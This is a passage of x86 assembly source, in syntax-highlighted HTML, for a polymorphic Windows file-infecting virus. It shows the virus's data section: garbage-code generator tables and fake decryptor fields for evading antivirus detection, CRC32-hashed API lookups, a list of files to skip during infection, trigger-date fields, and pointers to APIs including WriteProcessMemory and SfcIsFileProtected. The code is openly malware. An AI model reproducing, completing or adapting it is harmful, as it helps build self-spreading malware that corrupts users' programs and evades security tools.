                </span><span class="sc1">;------------------------------------------------------------</span><span class="sc0">
                </span><span class="sc1">;Garbage code generators</span><span class="sc0">
                </span><span class="sc1">;------------------------------------------------------------</span><span class="sc0">

</span><span class="sc5">tbl_garbage</span><span class="sc0">     </span><span class="sc9">equ</span><span class="sc0"> </span><span class="sc10">$</span><span class="sc0">

                </span><span class="sc9">dd</span><span class="sc0"> </span><span class="sc9">offset</span><span class="sc0"> </span><span class="sc5">gen_save_code</span><span class="sc0">     </span><span class="sc1">;clc stc cmc cld std</span><span class="sc0">
                </span><span class="sc9">dd</span><span class="sc0"> </span><span class="sc9">offset</span><span class="sc0"> </span><span class="sc5">g_movreg32imm</span><span class="sc0">         </span><span class="sc1">;mov reg32,imm</span><span class="sc0">
                </span><span class="sc9">dd</span><span class="sc0"> </span><span class="sc9">offset</span><span class="sc0"> </span><span class="sc5">g_movreg16imm</span><span class="sc0">         </span><span class="sc1">;mov reg16,imm</span><span class="sc0">
                </span><span class="sc9">dd</span><span class="sc0"> </span><span class="sc9">offset</span><span class="sc0"> </span><span class="sc5">g_movreg8imm</span><span class="sc0">          </span><span class="sc1">;mov reg8,imm</span><span class="sc0">
        </span><span class="sc9">dd</span><span class="sc0"> </span><span class="sc9">offset</span><span class="sc0"> </span><span class="sc5">g_xchgregreg32</span><span class="sc0">    </span><span class="sc1">;xchg reg32,reg32</span><span class="sc0">
        </span><span class="sc9">dd</span><span class="sc0"> </span><span class="sc9">offset</span><span class="sc0"> </span><span class="sc5">g_xchgregreg16</span><span class="sc0">    </span><span class="sc1">;xchg reg16,reg16</span><span class="sc0">
        </span><span class="sc9">dd</span><span class="sc0"> </span><span class="sc9">offset</span><span class="sc0"> </span><span class="sc5">g_xchgregreg8</span><span class="sc0">     </span><span class="sc1">;xchg reg8,reg8</span><span class="sc0">
                </span><span class="sc9">dd</span><span class="sc0"> </span><span class="sc9">offset</span><span class="sc0"> </span><span class="sc5">g_movregreg32</span><span class="sc0">         </span><span class="sc1">;mov reg32,reg32</span><span class="sc0">
                </span><span class="sc9">dd</span><span class="sc0"> </span><span class="sc9">offset</span><span class="sc0"> </span><span class="sc5">g_movregreg16</span><span class="sc0">         </span><span class="sc1">;mov reg16,reg16</span><span class="sc0">
        </span><span class="sc9">dd</span><span class="sc0"> </span><span class="sc9">offset</span><span class="sc0"> </span><span class="sc5">g_movregreg8</span><span class="sc0">          </span><span class="sc1">;mov reg8,reg8</span><span class="sc0">
        </span><span class="sc9">dd</span><span class="sc0"> </span><span class="sc9">offset</span><span class="sc0"> </span><span class="sc5">g_inc_reg32</span><span class="sc0">       </span><span class="sc1">;inc reg32</span><span class="sc0">
        </span><span class="sc9">dd</span><span class="sc0"> </span><span class="sc9">offset</span><span class="sc0"> </span><span class="sc5">g_inc_reg16</span><span class="sc0">       </span><span class="sc1">;inc reg16</span><span class="sc0">
        </span><span class="sc9">dd</span><span class="sc0"> </span><span class="sc9">offset</span><span class="sc0"> </span><span class="sc5">g_inc_reg8</span><span class="sc0">        </span><span class="sc1">;inc reg8</span><span class="sc0">
        </span><span class="sc9">dd</span><span class="sc0"> </span><span class="sc9">offset</span><span class="sc0"> </span><span class="sc5">g_dec_reg32</span><span class="sc0">       </span><span class="sc1">;dec reg32</span><span class="sc0">
        </span><span class="sc9">dd</span><span class="sc0"> </span><span class="sc9">offset</span><span class="sc0"> </span><span class="sc5">g_dec_reg16</span><span class="sc0">       </span><span class="sc1">;dec reg16</span><span class="sc0">
        </span><span class="sc9">dd</span><span class="sc0"> </span><span class="sc9">offset</span><span class="sc0"> </span><span class="sc5">g_dec_reg8</span><span class="sc0">        </span><span class="sc1">;dec reg8</span><span class="sc0">
                </span><span class="sc9">dd</span><span class="sc0"> </span><span class="sc9">offset</span><span class="sc0"> </span><span class="sc5">g_mathregimm32</span><span class="sc0">        </span><span class="sc1">;math reg32,imm</span><span class="sc0">
                </span><span class="sc9">dd</span><span class="sc0"> </span><span class="sc9">offset</span><span class="sc0"> </span><span class="sc5">g_mathregimm16</span><span class="sc0">        </span><span class="sc1">;math reg16,imm</span><span class="sc0">
                </span><span class="sc9">dd</span><span class="sc0"> </span><span class="sc9">offset</span><span class="sc0"> </span><span class="sc5">g_mathregimm8</span><span class="sc0">         </span><span class="sc1">;math reg8,imm</span><span class="sc0">
                </span><span class="sc9">dd</span><span class="sc0"> </span><span class="sc9">offset</span><span class="sc0"> </span><span class="sc5">g_movzx_movsx</span><span class="sc0">         </span><span class="sc1">;movzx/movsx reg32,reg16</span><span class="sc0">

</span><span class="sc5">save_space</span><span class="sc0">  </span><span class="sc9">equ</span><span class="sc0"> </span><span class="sc10">$</span><span class="sc0">

        </span><span class="sc9">dd</span><span class="sc0"> </span><span class="sc9">offset</span><span class="sc0"> </span><span class="sc5">gen_mov_mem32</span><span class="sc0">     </span><span class="sc1">;mov mem,reg32</span><span class="sc0">
        </span><span class="sc9">dd</span><span class="sc0"> </span><span class="sc9">offset</span><span class="sc0"> </span><span class="sc5">gen_mov_mem16</span><span class="sc0">     </span><span class="sc1">;mov mem,reg16</span><span class="sc0">
        </span><span class="sc9">dd</span><span class="sc0"> </span><span class="sc9">offset</span><span class="sc0"> </span><span class="sc5">gen_mov_mem8</span><span class="sc0">      </span><span class="sc1">;mov mem,reg8</span><span class="sc0">
        </span><span class="sc9">dd</span><span class="sc0"> </span><span class="sc9">offset</span><span class="sc0"> </span><span class="sc5">gen_add_mem32</span><span class="sc0">     </span><span class="sc1">;add mem,reg32</span><span class="sc0">
        </span><span class="sc9">dd</span><span class="sc0"> </span><span class="sc9">offset</span><span class="sc0"> </span><span class="sc5">gen_add_mem16</span><span class="sc0">     </span><span class="sc1">;add mem,reg16</span><span class="sc0">
        </span><span class="sc9">dd</span><span class="sc0"> </span><span class="sc9">offset</span><span class="sc0"> </span><span class="sc5">gen_add_mem8</span><span class="sc0">      </span><span class="sc1">;add mem,reg8</span><span class="sc0">
        </span><span class="sc9">dd</span><span class="sc0"> </span><span class="sc9">offset</span><span class="sc0"> </span><span class="sc5">gen_sub_mem32</span><span class="sc0">     </span><span class="sc1">;sub mem,reg32</span><span class="sc0">
        </span><span class="sc9">dd</span><span class="sc0"> </span><span class="sc9">offset</span><span class="sc0"> </span><span class="sc5">gen_sub_mem16</span><span class="sc0">     </span><span class="sc1">;sub mem,reg16</span><span class="sc0">
        </span><span class="sc9">dd</span><span class="sc0"> </span><span class="sc9">offset</span><span class="sc0"> </span><span class="sc5">gen_sub_mem8</span><span class="sc0">      </span><span class="sc1">;sub mem,reg8</span><span class="sc0">
        </span><span class="sc9">dd</span><span class="sc0"> </span><span class="sc9">offset</span><span class="sc0"> </span><span class="sc5">gen_adc_mem32</span><span class="sc0">     </span><span class="sc1">;adc mem,reg32</span><span class="sc0">
        </span><span class="sc9">dd</span><span class="sc0"> </span><span class="sc9">offset</span><span class="sc0"> </span><span class="sc5">gen_adc_mem16</span><span class="sc0">     </span><span class="sc1">;adc mem,reg16</span><span class="sc0">
        </span><span class="sc9">dd</span><span class="sc0"> </span><span class="sc9">offset</span><span class="sc0"> </span><span class="sc5">gen_adc_mem8</span><span class="sc0">      </span><span class="sc1">;adc mem,reg8</span><span class="sc0">
        </span><span class="sc9">dd</span><span class="sc0"> </span><span class="sc9">offset</span><span class="sc0"> </span><span class="sc5">gen_sbb_mem32</span><span class="sc0">     </span><span class="sc1">;sbb mem,reg32</span><span class="sc0">
        </span><span class="sc9">dd</span><span class="sc0"> </span><span class="sc9">offset</span><span class="sc0"> </span><span class="sc5">gen_sbb_mem16</span><span class="sc0">     </span><span class="sc1">;sbb mem,reg16</span><span class="sc0">
        </span><span class="sc9">dd</span><span class="sc0"> </span><span class="sc9">offset</span><span class="sc0"> </span><span class="sc5">gen_sbb_mem8</span><span class="sc0">      </span><span class="sc1">;sbb mem,reg8</span><span class="sc0">
        </span><span class="sc9">dd</span><span class="sc0"> </span><span class="sc9">offset</span><span class="sc0"> </span><span class="sc5">gen_or_mem32</span><span class="sc0">      </span><span class="sc1">;or mem,reg32</span><span class="sc0">
        </span><span class="sc9">dd</span><span class="sc0"> </span><span class="sc9">offset</span><span class="sc0"> </span><span class="sc5">gen_or_mem16</span><span class="sc0">      </span><span class="sc1">;or mem,reg16</span><span class="sc0">
        </span><span class="sc9">dd</span><span class="sc0"> </span><span class="sc9">offset</span><span class="sc0"> </span><span class="sc5">gen_or_mem8</span><span class="sc0">       </span><span class="sc1">;or mem,reg8</span><span class="sc0">
        </span><span class="sc9">dd</span><span class="sc0"> </span><span class="sc9">offset</span><span class="sc0"> </span><span class="sc5">gen_and_mem32</span><span class="sc0">     </span><span class="sc1">;and mem,reg32</span><span class="sc0">
        </span><span class="sc9">dd</span><span class="sc0"> </span><span class="sc9">offset</span><span class="sc0"> </span><span class="sc5">gen_and_mem16</span><span class="sc0">     </span><span class="sc1">;and mem,reg16</span><span class="sc0">
        </span><span class="sc9">dd</span><span class="sc0"> </span><span class="sc9">offset</span><span class="sc0"> </span><span class="sc5">gen_and_mem8</span><span class="sc0">      </span><span class="sc1">;and mem,reg8</span><span class="sc0">
        </span><span class="sc9">dd</span><span class="sc0"> </span><span class="sc9">offset</span><span class="sc0"> </span><span class="sc5">gen_xor_mem32</span><span class="sc0">     </span><span class="sc1">;xor mem,reg32</span><span class="sc0">
        </span><span class="sc9">dd</span><span class="sc0"> </span><span class="sc9">offset</span><span class="sc0"> </span><span class="sc5">gen_xor_mem16</span><span class="sc0">     </span><span class="sc1">;xor mem,reg16</span><span class="sc0">
        </span><span class="sc9">dd</span><span class="sc0"> </span><span class="sc9">offset</span><span class="sc0"> </span><span class="sc5">gen_xor_mem8</span><span class="sc0">      </span><span class="sc1">;xor mem,reg8</span><span class="sc0">
                </span><span class="sc9">dd</span><span class="sc0"> </span><span class="sc9">offset</span><span class="sc0"> </span><span class="sc5">g_push_g_pop</span><span class="sc0">          </span><span class="sc1">;push reg/garbage/pop reg</span><span class="sc0">
                </span><span class="sc9">dd</span><span class="sc0"> </span><span class="sc9">offset</span><span class="sc0"> </span><span class="sc5">g_call_cont</span><span class="sc0">           </span><span class="sc1">;call/garbage/pop</span><span class="sc0">
                </span><span class="sc9">dd</span><span class="sc0"> </span><span class="sc9">offset</span><span class="sc0"> </span><span class="sc5">g_jump_u</span><span class="sc0">              </span><span class="sc1">;jump/rnd block</span><span class="sc0">
                </span><span class="sc9">dd</span><span class="sc0"> </span><span class="sc9">offset</span><span class="sc0"> </span><span class="sc5">g_jump_c</span><span class="sc0">              </span><span class="sc1">;jump conditional/garbage               </span><span class="sc0">
        </span><span class="sc9">dd</span><span class="sc0"> </span><span class="sc9">offset</span><span class="sc0"> </span><span class="sc5">gen_fake_crypt</span><span class="sc0">    </span><span class="sc1">;fake decryptor instruction</span><span class="sc0">

</span><span class="sc5">end_garbage</span><span class="sc0">     </span><span class="sc9">equ</span><span class="sc0"> </span><span class="sc10">$</span><span class="sc0">

                </span><span class="sc1">;------------------------------------------------------------</span><span class="sc0">
        </span><span class="sc1">;Generators of code that does not change register contents</span><span class="sc0">
                </span><span class="sc1">;------------------------------------------------------------</span><span class="sc0">

</span><span class="sc5">tbl_free</span><span class="sc0">        </span><span class="sc9">equ</span><span class="sc0"> </span><span class="sc10">$</span><span class="sc0">

            </span><span class="sc9">dd</span><span class="sc0"> </span><span class="sc9">offset</span><span class="sc0"> </span><span class="sc5">g_save_jump</span><span class="sc0">
            </span><span class="sc9">dd</span><span class="sc0"> </span><span class="sc9">offset</span><span class="sc0"> </span><span class="sc5">gen_save_code</span><span class="sc0">

</span><span class="sc5">end_free</span><span class="sc0">        </span><span class="sc9">equ</span><span class="sc0"> </span><span class="sc10">$</span><span class="sc0">
                
</span><span class="sc1">;----------------------------------------------------------------------------</span><span class="sc0">
</span><span class="sc1">;CRC32 of API names</span><span class="sc0">
</span><span class="sc1">;----------------------------------------------------------------------------</span><span class="sc0">

</span><span class="sc5">CrcKernel32</span><span class="sc0">     </span><span class="sc9">dd</span><span class="sc0"> </span><span class="sc2">00000000h</span><span class="sc0"> </span><span class="sc1">;CRC32 of KERNEL dll name</span><span class="sc0">

</span><span class="sc5">CrcGetProcAddr</span><span class="sc0">      </span><span class="sc9">dd</span><span class="sc0"> </span><span class="sc2">00000000h</span><span class="sc0"> </span><span class="sc1">;This API takes special care</span><span class="sc0">

</span><span class="sc5">CRC32K32Apis</span><span class="sc0">        </span><span class="sc9">dd</span><span class="sc0"> </span><span class="sc5">NumK32Apis</span><span class="sc0"> </span><span class="sc9">dup</span><span class="sc0"> </span><span class="sc4">(</span><span class="sc2">00000000h</span><span class="sc4">)</span><span class="sc0">

</span><span class="sc5">CRC32SFCApis</span><span class="sc0">        </span><span class="sc9">dd</span><span class="sc0"> </span><span class="sc5">NumSFCApis</span><span class="sc0"> </span><span class="sc9">dup</span><span class="sc0"> </span><span class="sc4">(</span><span class="sc2">00000000h</span><span class="sc4">)</span><span class="sc0">

</span><span class="sc1">;----------------------------------------------------------------------------</span><span class="sc0">
</span><span class="sc1">;Avoid some files from being infected</span><span class="sc0">
</span><span class="sc1">;----------------------------------------------------------------------------</span><span class="sc0">

</span><span class="sc5">avoid_tbl</span><span class="sc0">       </span><span class="sc9">dd</span><span class="sc0"> </span><span class="sc5">avoid_num</span><span class="sc0"> </span><span class="sc9">dup</span><span class="sc0"> </span><span class="sc4">(</span><span class="sc2">00000000h</span><span class="sc4">)</span><span class="sc0">

</span><span class="sc1">;----------------------------------------------------------------------------</span><span class="sc0">
</span><span class="sc1">;Activation date/time for this virus copy</span><span class="sc0">
</span><span class="sc1">;----------------------------------------------------------------------------</span><span class="sc0">

</span><span class="sc5">activate_month</span><span class="sc0">      </span><span class="sc9">dw</span><span class="sc0"> </span><span class="sc2">0000h</span><span class="sc0">
</span><span class="sc5">activate_day</span><span class="sc0">        </span><span class="sc9">dw</span><span class="sc0"> </span><span class="sc2">0000h</span><span class="sc0">
</span><span class="sc5">activate_hour</span><span class="sc0">       </span><span class="sc9">dw</span><span class="sc0"> </span><span class="sc2">0000h</span><span class="sc0">

</span><span class="sc1">;----------------------------------------------------------------------------</span><span class="sc0">
</span><span class="sc1">;End of CRC32 protected area</span><span class="sc0">
</span><span class="sc1">;----------------------------------------------------------------------------</span><span class="sc0">

</span><span class="sc5">SizeOfProtect</span><span class="sc0">       </span><span class="sc9">equ</span><span class="sc0"> </span><span class="sc10">$</span><span class="sc4">-</span><span class="sc5">CRC_protected</span><span class="sc0">

</span><span class="sc1">;----------------------------------------------------------------------------</span><span class="sc0">
</span><span class="sc1">;End of virus image in files</span><span class="sc0">
</span><span class="sc1">;----------------------------------------------------------------------------</span><span class="sc0">

</span><span class="sc5">inf_size</span><span class="sc0">        </span><span class="sc9">equ</span><span class="sc0"> </span><span class="sc10">$</span><span class="sc4">-</span><span class="sc5">viro_sys</span><span class="sc0">

</span><span class="sc1">;----------------------------------------------------------------------------</span><span class="sc0">
</span><span class="sc1">;Seed for random number generator</span><span class="sc0">
</span><span class="sc1">;----------------------------------------------------------------------------</span><span class="sc0">

</span><span class="sc5">rnd32_seed</span><span class="sc0">          </span><span class="sc9">dd</span><span class="sc0"> </span><span class="sc2">00000000h</span><span class="sc0">

</span><span class="sc1">;----------------------------------------------------------------------------</span><span class="sc0">
</span><span class="sc1">;CRC32 lookup table</span><span class="sc0">
</span><span class="sc1">;----------------------------------------------------------------------------</span><span class="sc0">

</span><span class="sc5">tbl_crc32</span><span class="sc0">       </span><span class="sc9">dd</span><span class="sc0"> </span><span class="sc2">0100h</span><span class="sc0"> </span><span class="sc9">dup</span><span class="sc0"> </span><span class="sc4">(</span><span class="sc2">00000000h</span><span class="sc4">)</span><span class="sc0">

</span><span class="sc1">;----------------------------------------------------------------------------</span><span class="sc0">
</span><span class="sc1">;KERNEL32 API's</span><span class="sc0">
</span><span class="sc1">;----------------------------------------------------------------------------</span><span class="sc0">

</span><span class="sc1">;GetProcAddress API takes special care</span><span class="sc0">

</span><span class="sc5">a_GetProcAddress</span><span class="sc0">    </span><span class="sc9">dd</span><span class="sc0"> </span><span class="sc2">00000000h</span><span class="sc0">

</span><span class="sc5">epK32Apis</span><span class="sc0">       </span><span class="sc9">equ</span><span class="sc0"> </span><span class="sc10">$</span><span class="sc0">

</span><span class="sc5">a_CreateFileA</span><span class="sc0">       </span><span class="sc9">dd</span><span class="sc0"> </span><span class="sc2">00000000h</span><span class="sc0">
</span><span class="sc5">a_CreateFileMappingA</span><span class="sc0">    </span><span class="sc9">dd</span><span class="sc0"> </span><span class="sc2">00000000h</span><span class="sc0">
</span><span class="sc5">a_CloseHandle</span><span class="sc0">       </span><span class="sc9">dd</span><span class="sc0"> </span><span class="sc2">00000000h</span><span class="sc0">
</span><span class="sc5">a_FindClose</span><span class="sc0">     </span><span class="sc9">dd</span><span class="sc0"> </span><span class="sc2">00000000h</span><span class="sc0">
</span><span class="sc5">a_FindFirstFileA</span><span class="sc0">    </span><span class="sc9">dd</span><span class="sc0"> </span><span class="sc2">00000000h</span><span class="sc0">
</span><span class="sc5">a_FindNextFileA</span><span class="sc0">     </span><span class="sc9">dd</span><span class="sc0"> </span><span class="sc2">00000000h</span><span class="sc0">
</span><span class="sc5">a_FreeLibrary</span><span class="sc0">       </span><span class="sc9">dd</span><span class="sc0"> </span><span class="sc2">00000000h</span><span class="sc0">
</span><span class="sc5">a_GetCurrentDirectoryA</span><span class="sc0">  </span><span class="sc9">dd</span><span class="sc0"> </span><span class="sc2">00000000h</span><span class="sc0">
</span><span class="sc5">a_GetCurrentProcess</span><span class="sc0"> </span><span class="sc9">dd</span><span class="sc0"> </span><span class="sc2">00000000h</span><span class="sc0">
</span><span class="sc5">a_GetFileAttributesA</span><span class="sc0">    </span><span class="sc9">dd</span><span class="sc0"> </span><span class="sc2">00000000h</span><span class="sc0">
</span><span class="sc5">a_GetLocalTime</span><span class="sc0">      </span><span class="sc9">dd</span><span class="sc0"> </span><span class="sc2">00000000h</span><span class="sc0">
</span><span class="sc5">a_GetSystemDirectoryA</span><span class="sc0">   </span><span class="sc9">dd</span><span class="sc0"> </span><span class="sc2">00000000h</span><span class="sc0">
</span><span class="sc5">a_GetVersionEx</span><span class="sc0">      </span><span class="sc9">dd</span><span class="sc0"> </span><span class="sc2">00000000h</span><span class="sc0">
</span><span class="sc5">a_GetWindowsDirectoryA</span><span class="sc0">  </span><span class="sc9">dd</span><span class="sc0"> </span><span class="sc2">00000000h</span><span class="sc0">
</span><span class="sc5">a_LoadLibraryA</span><span class="sc0">      </span><span class="sc9">dd</span><span class="sc0"> </span><span class="sc2">00000000h</span><span class="sc0">
</span><span class="sc5">a_MapViewOfFile</span><span class="sc0">     </span><span class="sc9">dd</span><span class="sc0"> </span><span class="sc2">00000000h</span><span class="sc0">
</span><span class="sc5">a_SetEndOfFile</span><span class="sc0">      </span><span class="sc9">dd</span><span class="sc0"> </span><span class="sc2">00000000h</span><span class="sc0">
</span><span class="sc5">a_SetFileAttributesA</span><span class="sc0">    </span><span class="sc9">dd</span><span class="sc0"> </span><span class="sc2">00000000h</span><span class="sc0">
</span><span class="sc5">a_SetFilePointer</span><span class="sc0">    </span><span class="sc9">dd</span><span class="sc0"> </span><span class="sc2">00000000h</span><span class="sc0">
</span><span class="sc5">a_SetFileTime</span><span class="sc0">       </span><span class="sc9">dd</span><span class="sc0"> </span><span class="sc2">00000000h</span><span class="sc0">
</span><span class="sc5">a_UnmapViewOfFile</span><span class="sc0">   </span><span class="sc9">dd</span><span class="sc0"> </span><span class="sc2">00000000h</span><span class="sc0">
</span><span class="sc5">a_VirtualAlloc</span><span class="sc0">      </span><span class="sc9">dd</span><span class="sc0"> </span><span class="sc2">00000000h</span><span class="sc0">
</span><span class="sc5">a_WriteProcessMemory</span><span class="sc0">    </span><span class="sc9">dd</span><span class="sc0"> </span><span class="sc2">00000000h</span><span class="sc0">

</span><span class="sc5">NumK32Apis</span><span class="sc0">      </span><span class="sc9">equ</span><span class="sc0"> </span><span class="sc4">(</span><span class="sc10">$</span><span class="sc4">-</span><span class="sc5">epK32Apis</span><span class="sc4">)/</span><span class="sc2">04h</span><span class="sc0">

</span><span class="sc5">hKERNEL32</span><span class="sc0">       </span><span class="sc9">dd</span><span class="sc0"> </span><span class="sc2">00000000h</span><span class="sc0">

</span><span class="sc1">;----------------------------------------------------------------------------</span><span class="sc0">
</span><span class="sc1">;This buffer resides here because is used before memory allocation</span><span class="sc0">
</span><span class="sc1">;----------------------------------------------------------------------------</span><span class="sc0">

</span><span class="sc5">BufStrFilename</span><span class="sc0">      </span><span class="sc9">db</span><span class="sc0"> </span><span class="sc5">MAX_PATH</span><span class="sc0"> </span><span class="sc9">dup</span><span class="sc0"> </span><span class="sc4">(</span><span class="sc2">00000000h</span><span class="sc4">)</span><span class="sc0">

</span><span class="sc1">;----------------------------------------------------------------------------</span><span class="sc0">
</span><span class="sc1">;End of virus virtual image</span><span class="sc0">
</span><span class="sc1">;----------------------------------------------------------------------------</span><span class="sc0">

</span><span class="sc5">size_virtual</span><span class="sc0">        </span><span class="sc9">equ</span><span class="sc0"> </span><span class="sc10">$</span><span class="sc4">-</span><span class="sc5">viro_sys</span><span class="sc0">

</span><span class="sc1">;----------------------------------------------------------------------------</span><span class="sc0">
</span><span class="sc1">;ADVAPI32.DLL APIs used by the virus</span><span class="sc0">
</span><span class="sc1">;----------------------------------------------------------------------------</span><span class="sc0">

</span><span class="sc5">epSFCApis</span><span class="sc0">       </span><span class="sc9">equ</span><span class="sc0"> </span><span class="sc10">$</span><span class="sc0">

</span><span class="sc5">a_SfcIsFileProtected</span><span class="sc0">    </span><span class="sc9">dd</span><span class="sc0"> </span><span class="sc2">00000000h</span><span class="sc0">

</span><span class="sc5">NumSFCApis</span><span class="sc0">      </span><span class="sc9">equ</span><span class="sc0"> </span><span class="sc4">(</span><span class="sc10">$</span><span class="sc4">-</span><span class="sc5">epSFCApis</span><span class="sc4">)/</span><span class="sc2">04h</span><span class="sc0">

</span><span class="sc5">hSFCDLL</span><span class="sc0">         </span><span class="sc9">dd</span><span class="sc0"> </span><span class="sc2">00000000h</span><span class="sc0">

</span><span class="sc1">;----------------------------------------------------------------------------</span><span class="sc0">
</span><span class="sc1">;Misc variables</span><span class="sc0">
</span><span class="sc1">;----------------------------------------------------------------------------</span><span class="sc0">

</span><span class="sc5">map_is_here</span><span class="sc0">     </span><span class="sc9">dd</span><span class="sc0"> </span><span class="sc2">00000000h</span><span class="sc0">
</span><span class="sc5">FileImport</span><span class="sc0">      </span><span class="sc9">dd</span><span class="sc0"> </span><span class="sc2">00000000h</span><span class="sc0">
</span><span class="sc5">ImportSH</span><span class="sc0">        </span><span class="sc9">dd</span><span class="sc0"> </span><span class="sc2">00000000h</span><span class="sc0">
</span><span class="sc5">inject_offs</span><span class="sc0">     </span><span class="sc9">dd</span><span class="sc0"> </span><span class="sc2">00000000h</span><span class="sc0">
</span><span class="sc5">vir_offset</span><span class="sc0">      </span><span class="sc9">dd</span><span class="sc0"> </span><span class="sc2">00000000h</span><span class="sc0">
</span><span class="sc5">search_raw</span><span class="sc0">      </span><span class="sc9">dd</span><span class="sc0"> </span><span class="sc2">00000000h</span><span class="sc0">
</span><span class="sc5">host_base</span><span class="sc0">       </span><span class="sc9">dd</span><span class="sc0"> </span><span class="sc2">00000000h</span><span class="sc0">
</span><span class="sc5">virus_sh</span><span class="sc0">        </span><span class="sc9">dd</span><span class="sc0"> </span><span class="sc2">00000000h</span><span class="sc0">
</span><span class="sc5">fix_size</span><span class="sc0">        </span><span class="sc9">dd</span><span class="sc0"> </span><span class="sc2">00000000h</span><span class="sc0">
</span><span class="sc5">raw_align</span><span class="sc0">       </span><span class="sc9">dd</span><span class="sc0"> </span><span class="sc2">00000000h</span><span class="sc0">
</span><span class="sc5">K32CodeStart</span><span class="sc0">        </span><span class="sc9">dd</span><span class="sc0"> </span><span class="sc2">00000000h</span><span class="sc0">
</span><span class="sc5">K32CodeEnd</span><span class="sc0">      </span><span class="sc9">dd</span><span class="sc0"> </span><span class="sc2">00000000h</span><span class="sc0">
</span><span class="sc5">KeySize</span><span class="sc0">         </span><span class="sc9">dd</span><span class="sc0"> </span><span class="sc2">00000000h</span><span class="sc0">
</span><span class="sc5">KeyValue</span><span class="sc0">        </span><span class="sc9">dd</span><span class="sc0"> </span><span class="sc2">00000000h</span><span class="sc0">

</span><span class="sc5">NumInfected</span><span class="sc0">     </span><span class="sc9">db</span><span class="sc0"> </span><span class="sc2">00</span><span class="sc0">

</span><span class="sc1">;----------------------------------------------------------------------------</span><span class="sc0">
</span><span class="sc1">;Poly engine uninitialized data</span><span class="sc0">
</span><span class="sc1">;----------------------------------------------------------------------------</span><span class="sc0">

</span><span class="sc5">CRYPT_DIRECTION</span><span class="sc0"> </span><span class="sc9">equ</span><span class="sc0"> </span><span class="sc2">01h</span><span class="sc0">
</span><span class="sc5">CRYPT_CMPCTR</span><span class="sc0">    </span><span class="sc9">equ</span><span class="sc0"> </span><span class="sc2">02h</span><span class="sc0">
</span><span class="sc5">CRYPT_CDIR</span><span class="sc0">      </span><span class="sc9">equ</span><span class="sc0"> </span><span class="sc2">04h</span><span class="sc0">
</span><span class="sc5">CRYPT_SIMPLEX</span><span class="sc0">   </span><span class="sc9">equ</span><span class="sc0"> </span><span class="sc2">10h</span><span class="sc0">
</span><span class="sc5">CRYPT_COMPLEX</span><span class="sc0">   </span><span class="sc9">equ</span><span class="sc0"> </span><span class="sc2">20h</span><span class="sc0">

</span><span class="sc5">PtrToCrypt</span><span class="sc0">  </span><span class="sc9">dd</span><span class="sc0"> </span><span class="sc2">00000000h</span><span class="sc0">    </span><span class="sc1">;Pointer to area to encrypt</span><span class="sc0">
</span><span class="sc5">PtrToDecrypt</span><span class="sc0">    </span><span class="sc9">dd</span><span class="sc0"> </span><span class="sc2">00000000h</span><span class="sc0">    </span><span class="sc1">;Where to generate polymorphic decryptor</span><span class="sc0">
</span><span class="sc5">PtrToEP</span><span class="sc0">     </span><span class="sc9">dd</span><span class="sc0"> </span><span class="sc2">00000000h</span><span class="sc0">    </span><span class="sc1">;Pointer to code entry-point once decrypted</span><span class="sc0">
</span><span class="sc5">SizeCrypt</span><span class="sc0">   </span><span class="sc9">dd</span><span class="sc0"> </span><span class="sc2">00000000h</span><span class="sc0">    </span><span class="sc1">;Size of area to encrypt</span><span class="sc0">
</span><span class="sc5">end_value</span><span class="sc0">       </span><span class="sc9">dd</span><span class="sc0"> </span><span class="sc2">00000000h</span><span class="sc0">    </span><span class="sc1">;Index end value</span><span class="sc0">
</span><span class="sc5">loop_point</span><span class="sc0">      </span><span class="sc9">dd</span><span class="sc0"> </span><span class="sc2">00000000h</span><span class="sc0">    </span><span class="sc1">;Start address of decryption loop</span><span class="sc0">
</span><span class="sc5">entry_point</span><span class="sc0">     </span><span class="sc9">dd</span><span class="sc0"> </span><span class="sc2">00000000h</span><span class="sc0">    </span><span class="sc1">;Entry point to decryptor code</span><span class="sc0">
</span><span class="sc5">decryptor_size</span><span class="sc0">  </span><span class="sc9">dd</span><span class="sc0"> </span><span class="sc2">00000000h</span><span class="sc0">    </span><span class="sc1">;Size of generated decryptor</span><span class="sc0">
</span><span class="sc5">disp2disp</span><span class="sc0">   </span><span class="sc9">dd</span><span class="sc0"> </span><span class="sc2">00000000h</span><span class="sc0">    </span><span class="sc1">;Displacement over displacement </span><span class="sc0">

</span><span class="sc5">counter_mask</span><span class="sc0">    </span><span class="sc9">db</span><span class="sc0"> </span><span class="sc2">00h</span><span class="sc0">              </span><span class="sc1">;Mask of register used as counter</span><span class="sc0">
</span><span class="sc5">recursive_level</span><span class="sc0"> </span><span class="sc9">db</span><span class="sc0"> </span><span class="sc2">00h</span><span class="sc0">              </span><span class="sc1">;Garbage recursive layer</span><span class="sc0">
</span><span class="sc5">IsFirst</span><span class="sc0">     </span><span class="sc9">db</span><span class="sc0"> </span><span class="sc2">00h</span><span class="sc0">          </span><span class="sc1">;Save registers only on 1st decryptor</span><span class="sc0">

</span><span class="sc5">fake_field</span><span class="sc0">          </span><span class="sc9">equ</span><span class="sc0"> </span><span class="sc10">$</span><span class="sc0">

</span><span class="sc5">ptr_disp</span><span class="sc0">        </span><span class="sc9">dd</span><span class="sc0"> </span><span class="sc2">00000000h</span><span class="sc0">    </span><span class="sc1">;Displacement from index</span><span class="sc0">
</span><span class="sc5">fake_ptr_disp</span><span class="sc0">       </span><span class="sc9">dd</span><span class="sc0"> </span><span class="sc2">00000000h</span><span class="sc0">    </span><span class="sc1">;...and fake one</span><span class="sc0">

</span><span class="sc5">crypt_key</span><span class="sc0">       </span><span class="sc9">dd</span><span class="sc0"> </span><span class="sc2">00000000h</span><span class="sc0">    </span><span class="sc1">;Encryption key</span><span class="sc0">
</span><span class="sc5">fake_crypt_key</span><span class="sc0">      </span><span class="sc9">dd</span><span class="sc0"> </span><span class="sc2">00000000h</span><span class="sc0">    </span><span class="sc1">;...and fake one</span><span class="sc0">

</span><span class="sc5">build_flags</span><span class="sc0">     </span><span class="sc9">db</span><span class="sc0"> </span><span class="sc2">00h</span><span class="sc0">          </span><span class="sc1">;Some decryptor flags</span><span class="sc0">
</span><span class="sc5">fake_build_flags</span><span class="sc0">    </span><span class="sc9">db</span><span class="sc0"> </span><span class="sc2">00h</span><span class="sc0">      </span><span class="sc1">;...and fake ones</span><span class="sc0">

</span><span class="sc5">oper_size</span><span class="sc0">       </span><span class="sc9">db</span><span class="sc0"> </span><span class="sc2">00h</span><span class="sc0">          </span><span class="sc1">;Size used (1=Byte 2=Word 4=Dword)</span><span class="sc0">
